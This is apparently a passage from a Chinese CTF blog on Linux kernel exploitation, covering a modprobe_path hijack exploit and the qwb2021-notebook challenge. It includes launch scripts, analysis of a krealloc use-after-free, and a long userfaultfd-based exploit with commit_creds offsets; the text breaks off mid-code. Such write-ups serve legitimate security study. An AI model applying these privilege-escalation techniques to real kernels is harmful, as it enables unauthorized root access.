editBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    allocBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    allocBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    data.length = <span class="number">0x40</span>;</span><br><span class="line">    readBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    <span class="keyword">if</span> ((data.ptr[<span class="number">2</span>] &amp; <span class="number">0xfff</span>) != <span class="number">0x30</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] invalid data leak: 0x%lx\n&quot;</span>, data.ptr[<span class="number">2</span>]);</span><br><span class="line">        errExit(<span class="string">&quot;\033[31m\033[1m[x] FAILED TO HIT page_offset_base! TRY AGAIN!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = data.ptr[<span class="number">2</span>] - <span class="number">0x30</span>;</span><br><span class="line">    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base:\033[0m 0x%lx\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel offset:\033[0m 0x%lx\n&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the modprobe_path, we&#x27;ll let it requesting new slub page for it */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking modprobe_path...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    allocBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    close(dev_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    data.ptr[<span class="number">0</span>] = kernel_offset + MODPROBE_PATH - <span class="number">0x10</span>;</span><br><span class="line">    data.offset = <span class="number">0</span>;</span><br><span class="line">    data.length = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">    editBuf(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    allocBuf(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    allocBuf(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *) &amp;data.ptr[<span class="number">2</span>], ROOT_SCRIPT_PATH);</span><br><span class="line">    data.length = <span class="number">0x30</span>;</span><br><span class="line">    editBuf(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* trigger the fake modprobe_path */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring fake modprobe_path...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/home/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read flag */</span></span><br><span class="line">    <span class="built_in">memset</span>(flag, <span class="number">0</span>, <span class="keyword">sizeof</span>(flag));</span><br><span class="line"></span><br><span class="line">    flag_fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (flag_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to chmod flag!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read(flag_fd, flag, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got flag: \033[0m%s\n&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="qwb2021-notebook"><a href="#qwb2021-notebook" class="headerlink" title="qwb2021-notebook"></a>qwb2021-notebook</h1><p>启动脚本<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">stty</span> intr ^]</span><br><span class="line"><span class="built_in">exec</span> <span class="built_in">timeout</span> 300 qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append <span class="string">&quot;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&quot;</span> -nographic -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap -monitor /dev/null 2&gt;/dev/null -s</span><br></pre></td></tr></table></figure></p><p>可以看到开启了smep,smap以及kaslr</p><p>此外内部还可以发现开启了kpti</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /sys/devices/system/cpu/vulnerabil</span><br><span class="line">ities/*</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Mitigation: __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpolin</span><br></pre></td></tr></table></figure><p>再看init脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">/bin/mount -t devtmpfs devtmpfs /dev</span><br><span class="line"><span class="built_in">chown</span> root:<span class="built_in">tty</span> /dev/console</span><br><span class="line"><span class="built_in">chown</span> root:<span class="built_in">tty</span> /dev/ptmx</span><br><span class="line"><span class="built_in">chown</span> root:<span class="built_in">tty</span> /dev/tty</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line">ifup eth0 &gt; /dev/null 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">insmod notebook.ko</span><br><span class="line"><span class="built_in">cat</span> /proc/modules | grep notebook &gt; /tmp/moduleaddr</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp/moduleaddr</span><br><span class="line"><span class="built_in">chmod</span> 777 /dev/notebook</span><br><span class="line">poweroff -d 300 -f &amp;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Welcome to QWB!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh</span></span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 1 -n -f</span><br></pre></td></tr></table></figure><p>重点便是notebook.ko</p><p>静态分析,设备文件初始化了read,write,ioctl这几个操作</p><p>主要漏洞在于ioctl菜单中存在一个edit功能</p><p>其允许调用kreallloc进行重新分配object,而当新的size大于旧的size时便会释放原先的obj</p><p>且下方存在一个copy_from_user这就为利用userfaultfd完成条件竞争提供了条件</p><p>这里选择利用tty设备文件完成利用</p><p>其实这题有其他不少解法,这里以学习userfaultfd的利用为主</p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SZIE 0x2E0</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> work_for_cpu_fn_off = <span class="number">0xffffffff8949eb90</span> - <span class="number">0xffffffff8a28e440</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred_off = <span class="number">0xffffffffa14a9ef0</span> - <span class="number">0xffffffffa228e440</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds_off = <span class="number">0xffffffffa14a9b40</span> - <span class="number">0xffffffffa228e440</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_base;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">userarg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">void</span>* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> note_fd;</span><br><span class="line"><span class="type">void</span>* stuck_mapped_memory;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ErrExit</span><span class="params">(<span class="type">char</span>* err_msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RegisterUserfault</span><span class="params">(<span class="type">void</span> *fault_page, <span class="type">void</span>* handler)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features    = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)fault_page; <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) <span class="comment">//注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//开一个线程，接收错误的信号，然后处理</span></span><br><span class="line">    <span class="type">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="type">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">noteadd</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">notearg</span>;</span></span><br><span class="line">    notearg.idx = idx;</span><br><span class="line">    notearg.size = size;</span><br><span class="line">    notearg.buf = buf;</span><br><span class="line">    ioctl(note_fd, <span class="number">0x100</span>, &amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">notegift</span><span class="params">(<span class="type">void</span>* buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">notearg</span>;</span></span><br><span class="line">    notearg.idx = <span class="number">0</span>;</span><br><span class="line">    notearg.size = <span class="number">0</span>;</span><br><span class="line">    notearg.buf = buf;</span><br><span class="line">    ioctl(note_fd, <span class="number">0x64</span>, &amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">notedel</span><span class="params">(<span class="type">size_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">notearg</span>;</span></span><br><span class="line">    notearg.idx = idx;</span><br><span class="line">    notearg.size = <span class="number">0</span>;</span><br><span class="line">    notearg.buf = <span class="literal">NULL</span>;</span><br><span class="line">    ioctl(note_fd, <span class="number">0x200</span>, &amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">noteedit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">notearg</span>;</span></span><br><span class="line">    notearg.idx = idx;</span><br><span class="line">    notearg.size = size;</span><br><span class="line">    notearg.buf = buf;</span><br><span class="line">    ioctl(note_fd, <span class="number">0x300</span>, &amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">OpenNote</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    note_fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (note_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] err in open notebook device&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">userfaultfd_sleep3_handler</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> uffd = (<span class="type">unsigned</span> <span class="type">long</span>) arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep3 handler created&quot;</span>);</span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep3 handler unblocked&quot;</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* page = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep3 handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">userfaultfd_stuck_handler</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> uffd = (<span class="type">unsigned</span> <span class="type">long</span>) arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler created&quot;</span>);</span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler unblocked&quot;</span>);</span><br><span class="line">    pause();</span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* page = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">edit_thread</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] edit thread start!&quot;</span>);</span><br><span class="line">    noteedit(idx, <span class="number">0</span>, stuck_mapped_memory);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] edit thread end!&quot;</span>); <span class="comment">// won&#x27;t reach here</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">add_thread</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] add thread start!&quot;</span>);</span><br><span class="line">    noteadd(idx, <span class="number">0x60</span>, stuck_mapped_memory);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] add thread end!&quot;</span>); <span class="comment">// 